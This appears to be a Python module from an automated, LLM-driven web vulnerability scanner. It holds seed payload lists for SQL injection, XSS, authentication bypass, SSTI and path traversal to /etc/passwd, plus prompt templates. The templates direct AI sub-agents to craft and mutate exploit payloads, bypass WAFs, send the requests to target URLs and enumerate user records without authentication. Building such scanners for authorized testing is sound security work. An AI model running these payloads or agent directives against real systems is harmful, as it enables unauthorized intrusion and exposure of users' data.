"""
Seed payload banks and prompt templates for sub-agent crews.

Seed payloads give the Payload Crafter LLM a starting library to work
from rather than inventing payloads from pure imagination.  Prompt
templates are parameterised per vulnerability type and iteration.
"""

# ---------------------------------------------------------------------------
# Seed payloads per vulnerability type
# ---------------------------------------------------------------------------

SEED_PAYLOADS: dict[str, list[dict]] = {
    "SQL_INJECTION": [
        {
            "payload": "'",
            "rationale": "Bare single quote to trigger SQL syntax error (error-based detection)",
        },
        {
            "payload": "' OR 1=1 --",
            "rationale": "Classic boolean-based authentication bypass",
        },
        {
            "payload": "' OR '1'='1' --",
            "rationale": "String-equality bypass variant",
        },
        {
            "payload": "' UNION SELECT null,null,null,null,null --",
            "rationale": "UNION-based column enumeration probe",
        },
        {
            "payload": "admin'--",
            "rationale": "Comment out password check for known username",
        },
        {
            "payload": "' OR 1=1#",
            "rationale": "MySQL-style comment bypass",
        },
        {
            "payload": "'; SELECT sqlite_version();--",
            "rationale": "SQLite-specific stacked query probe",
        },
        {
            "payload": "' OR sqlite_version() IS NOT NULL --",
            "rationale": "SQLite function injection to confirm DB type",
        },
    ],
    "XSS": [
        {
            "payload": "<script>alert('XSS')</script>",
            "rationale": "Classic inline script injection",
        },
        {
            "payload": "<img src=x onerror=alert('XSS')>",
            "rationale": "Event-handler injection via broken image",
        },
        {
            "payload": "<svg onload=alert('XSS')>",
            "rationale": "SVG event injection",
        },
        {
            "payload": "\"><script>alert('XSS')</script>",
            "rationale": "Attribute breakout followed by script tag",
        },
        {
            "payload": "<body onload=alert('XSS')>",
            "rationale": "Body tag event-handler injection",
        },
        {
            "payload": "<details open ontoggle=alert('XSS')>",
            "rationale": "HTML5 element event injection",
        },
    ],
    "AUTH_BYPASS": [
        {
            "payload": "' OR 1=1 --",
            "rationale": "SQL injection based authentication bypass",
        },
        {
            "payload": "admin",
            "rationale": "Default/common username probe",
        },
        {
            "payload": "' OR ''='",
            "rationale": "Empty-string tautology bypass",
        },
    ],
    "IDOR": [],  # IDOR uses sequential ID enumeration, not injection payloads
    "SSTI": [
        {
            "payload": "{{7*7191}}",
            "rationale": "Jinja2/Twig math evaluation — expect 50337 in response",
        },
        {
            "payload": "${7*7191}",
            "rationale": "Freemarker/EL/Mako math evaluation — expect 50337",
        },
        {
            "payload": "<%= 7*7191 %>",
            "rationale": "ERB (Ruby) math evaluation — expect 50337",
        },
        {
            "payload": "#{7*7191}",
            "rationale": "Java EL / Pebble math evaluation — expect 50337",
        },
        {
            "payload": "{{config}}",
            "rationale": "Jinja2 config dump — expect Flask config object",
        },
        {
            "payload": "{{''.__class__.__mro__}}",
            "rationale": "Jinja2 MRO traversal — expect Python class hierarchy",
        },
        {
            "payload": "${T(java.lang.Runtime).getRuntime()}",
            "rationale": "Spring EL runtime access probe",
        },
        {
            "payload": "{{request.application.__globals__}}",
            "rationale": "Jinja2 globals leak — expect Flask internals",
        },
    ],
    "LFI": [
        {
            "payload": "../../etc/passwd",
            "rationale": "Basic Unix path traversal — expect root: in response",
        },
        {
            "payload": "....//....//etc/passwd",
            "rationale": "Double-dot-slash bypass for ../ filters",
        },
        {
            "payload": "..%2f..%2f..%2fetc%2fpasswd",
            "rationale": "URL-encoded path traversal to bypass WAF",
        },
        {
            "payload": "/etc/passwd",
            "rationale": "Absolute path — tests if app prefixes user input to base dir",
        },
        {
            "payload": "....\\....\\etc\\passwd",
            "rationale": "Backslash variant for Windows-style path handling",
        },
        {
            "payload": "php://filter/convert.base64-encode/resource=/etc/passwd",
            "rationale": "PHP wrapper — returns base64-encoded file if PHP is used",
        },
        {
            "payload": "..%252f..%252f..%252fetc%252fpasswd",
            "rationale": "Double URL-encoded traversal — bypasses single-decode filters",
        },
        {
            "payload": "file:///etc/passwd",
            "rationale": "File scheme URI — tests if app follows file:// scheme",
        },
    ],
}


# ---------------------------------------------------------------------------
# Prompt templates for sub-agent roles
# ---------------------------------------------------------------------------

CRAFTER_PROMPT = """\
Generate a {vuln_type} exploit payload for {endpoint}.

TARGET: {target_url}
METHOD: {method}
ATTEMPT: {attempt_number} of {max_attempts}

SEED PAYLOADS:
{seed_payloads}

PREVIOUS FAILED ATTEMPTS:
{previous_attempts}

Pick a seed payload or create a variant. Do NOT repeat a failed payload.

You MUST respond with ONLY a JSON object, no other text. Example for POST:
{{"payload": "' OR 1=1 --", "injection_point": "username", "method": "POST", "url_path": "/api/login", "body_template": "{{\\"username\\": \\"' OR 1=1 --\\", \\"password\\": \\"x\\"}}", "rationale": "Boolean tautology bypass"}}

Example for GET:
{{"payload": "<script>alert(1)</script>", "injection_point": "q", "method": "GET", "url_path": "/api/search", "query_params": "{{\\"q\\": \\"<script>alert(1)</script>\\"}}", "rationale": "Classic script injection"}}

Respond with ONLY the JSON object. No explanation. No markdown. Just JSON.
"""

TESTER_PROMPT = """\
You MUST use the "HTTP Request Executor" tool to send the request below.

TARGET: {target_url}
METHOD: {method}

Read the Crafter's output from the previous task. It contains a JSON object with "payload", "method", "url_path", and either "body_template" (POST) or "query_params" (GET).

INSTRUCTIONS:
- If method is POST: call "HTTP Request Executor" with method="POST", url="{target_url}", body_json=<the body_template value from Crafter>.
- If method is GET: call "HTTP Request Executor" with method="GET", url="{target_url}", query_params_json=<the query_params value from Crafter>.

YOU MUST CALL THE TOOL. Do NOT theorize. Do NOT explain. Just call the tool and return its output.
If you cannot parse the Crafter's output, use this default:
- For GET {endpoint}: method="GET", url="{target_url}", query_params_json="{{\\"q\\": \\"<script>alert(1)</script>\\"}}"
- For POST {endpoint}: method="POST", url="{target_url}", body_json="{{\\"username\\": \\"' OR 1=1 --\\", \\"password\\": \\"x\\"}}"
"""

ANALYST_PROMPT = """\
Analyze the HTTP response from the Tester and decide if {vuln_type} exists at {endpoint}.

ATTEMPT: {attempt_number} of {max_attempts}

PREVIOUS ATTEMPTS:
{previous_attempts}

Look at the Tester's HTTP response. Decide ONE verdict:

1. CONFIRMED: Vulnerability is proven. Evidence required:
   - SQL_INJECTION: database error like "sqlite3.OperationalError" in body, OR HTTP 200 with token from invalid credentials
   - XSS: injected script tag appears unescaped in HTML body
   - IDOR: user PII returned without authentication
   - AUTH_BYPASS: HTTP 200 with token without valid credentials
   - SSTI: mathematical expression was evaluated by server (e.g., sent {{{{7*7191}}}} and "50337" appeared in response), OR server config/class hierarchy leaked
   - LFI: system file contents appeared (e.g., "root:x:0:0" from /etc/passwd), OR base64-encoded file content returned

2. DEAD END: Vulnerability does NOT exist. Input is sanitized, 404, or all payloads rejected cleanly.

3. TRY AGAIN: Inconclusive. A different payload might work.

You MUST respond with ONLY a JSON object. No other text. Examples:

Confirmed: {{"confirmed": true, "dead_end": false, "try_again": false, "evidence": "Response body contains: sqlite3.OperationalError near \\\"'\\\": syntax error", "failure_reason": null, "reasoning": "Raw database error proves SQL injection"}}

Dead end: {{"confirmed": false, "dead_end": true, "try_again": false, "evidence": null, "failure_reason": "Server returned 400 with sanitized error", "reasoning": "Input is properly validated"}}

Try again: {{"confirmed": false, "dead_end": false, "try_again": true, "evidence": null, "failure_reason": "Payload was URL-encoded by server", "reasoning": "Try a different encoding"}}

Respond with ONLY the JSON object. No explanation. No markdown.
"""

IDOR_CRAFTER_PROMPT = """\
Test for IDOR on {target_url} at /api/users/<id>.

ATTEMPT: {attempt_number} of {max_attempts}

PREVIOUS ATTEMPTS:
{previous_attempts}

Propose user IDs to enumerate without authentication.

You MUST respond with ONLY a JSON object. Example:
{{"payload": "1,2,3", "injection_point": "path_segment", "method": "GET", "url_path": "/api/users/", "rationale": "Sequential ID enumeration without auth"}}

Respond with ONLY the JSON object. No other text.
"""

IDOR_TESTER_PROMPT = """\
You MUST use the "HTTP Request Executor" tool to test for IDOR.

TARGET: {target_url}
ENDPOINT: /api/users/<id>

The Crafter proposed user IDs to enumerate (e.g. "1,2,3").
For EACH ID, call the "HTTP Request Executor" tool:
  method="GET", url="{target_url}/api/users/<id>"

Example: For ID 1, call the tool with method="GET", url="{target_url}/api/users/1"
Example: For ID 2, call the tool with method="GET", url="{target_url}/api/users/2"

Do NOT add authentication headers. Call the tool for EACH ID. Return all responses.
"""


# ---------------------------------------------------------------------------
# LOCAL-MODEL prompt templates (WhiteRabbitNeo + Foundation-Sec)
# ---------------------------------------------------------------------------
# These are shorter, more directive, and play to each model's strengths.
# WhiteRabbitNeo: offensive-first, knows bypass techniques natively.
# Foundation-Sec: excels at CVE root-cause analysis and CWE classification.

LOCAL_CRAFTER_PROMPT = """\
You are an offensive security expert. Craft a working {vuln_type} exploit payload.

TARGET: {target_url}
METHOD: {method}
ENDPOINT: {endpoint}
ATTEMPT: {attempt_number}/{max_attempts}

PREVIOUS FAILED ATTEMPTS:
{previous_attempts}

AVAILABLE SEED PAYLOADS:
{seed_payloads}

INSTRUCTIONS:
- If this is attempt 1, pick the most likely seed payload from the list above.
- If previous attempts failed, MUTATE: change encoding, try WAF bypass, use alternative syntax, try different injection points.
- Think like a real attacker: consider the target stack, error messages from previous attempts, and edge cases.
- For {vuln_type} specifically:
  * SQL_INJECTION / AUTH_BYPASS: try ' OR, UNION SELECT, comment tricks (--/#), stacked queries, type juggling
  * XSS: try <script>, event handlers (onerror/onload/onfocus), SVG/IMG tags, attribute breakout, encoding bypass
  * SSTI: try {{{{7*7191}}}}, ${{7*7191}}, <%=7*7191%>, config dumps, __class__ traversal
  * LFI: try ../../etc/passwd, URL-encoded traversal, PHP wrappers, null bytes, double encoding

OUTPUT FORMAT — respond with ONLY this JSON, nothing else:
For POST: {{"payload": "...", "injection_point": "username", "method": "POST", "url_path": "{endpoint}", "body_template": "{{\\"username\\": \\"PAYLOAD_HERE\\", \\"password\\": \\"x\\"}}", "rationale": "why this works"}}
For GET: {{"payload": "...", "injection_point": "q", "method": "GET", "url_path": "{endpoint}", "query_params": "{{\\"q\\": \\"PAYLOAD_HERE\\"}}", "rationale": "why this works"}}

RESPOND WITH ONLY JSON. NO EXPLANATION. NO MARKDOWN.
"""

LOCAL_ANALYST_PROMPT = """\
You are a vulnerability analyst. Analyze this HTTP response and classify the result.

VULNERABILITY TYPE: {vuln_type}
ENDPOINT: {endpoint}
ATTEMPT: {attempt_number}/{max_attempts}

PREVIOUS ATTEMPTS:
{previous_attempts}

HTTP RESPONSE FROM THIS ATTEMPT:
{http_response}

ANALYSIS GUIDE — check for these indicators:
- SQL_INJECTION: Look for database errors (sqlite3.OperationalError, syntax error, unrecognized token), stack traces, or SQL keywords in error messages. CWE-89.
- AUTH_BYPASS: HTTP 200 with authentication token/session returned for injected credentials. CWE-287.
- XSS: Injected payload (<script>, event handler, etc.) appears UNESCAPED in HTML response body. CWE-79.
- IDOR: User PII (username, email, personal data) returned without authentication. CWE-639.
- SSTI: Mathematical expression result appears (sent 7*7191, got 50337 in body WITHOUT the raw expression). Config objects or __class__/__mro__ in output. CWE-1336.
- LFI: System file contents like "root:x:0:0", "/bin/bash", Windows file markers, or base64-encoded file data. CWE-98.

VERDICT — pick exactly ONE:
- confirmed: Hard evidence found (specify exact evidence string from the response)
- dead_end: Target is NOT vulnerable — input sanitized, 404, or WAF blocking all attempts
- try_again: Inconclusive — a different payload variant might succeed

OUTPUT FORMAT — respond with ONLY this JSON:
{{"confirmed": false, "dead_end": false, "try_again": true, "evidence": null, "failure_reason": "what went wrong", "reasoning": "why this verdict"}}

RESPOND WITH ONLY JSON. NO EXPLANATION. NO MARKDOWN. NO CHAIN-OF-THOUGHT.
"""

LOCAL_IDOR_CRAFTER_PROMPT = """\
You are an offensive security expert. Test for IDOR (Insecure Direct Object Reference).

TARGET: {target_url}
ENDPOINT: /api/users/<id>
ATTEMPT: {attempt_number}/{max_attempts}

PREVIOUS ATTEMPTS:
{previous_attempts}

INSTRUCTIONS:
- Propose user IDs to enumerate WITHOUT authentication.
- Try sequential IDs (1,2,3), common admin IDs (0,1,100), negative IDs, or large IDs.
- If previous attempts returned data for some IDs, try adjacent IDs or different ranges.
- The goal is to access user records that should require authentication.

OUTPUT FORMAT — respond with ONLY this JSON:
{{"payload": "1,2,3", "injection_point": "path_segment", "method": "GET", "url_path": "/api/users/", "rationale": "Sequential enumeration without auth"}}

RESPOND WITH ONLY JSON. NO EXPLANATION. NO MARKDOWN.
"""
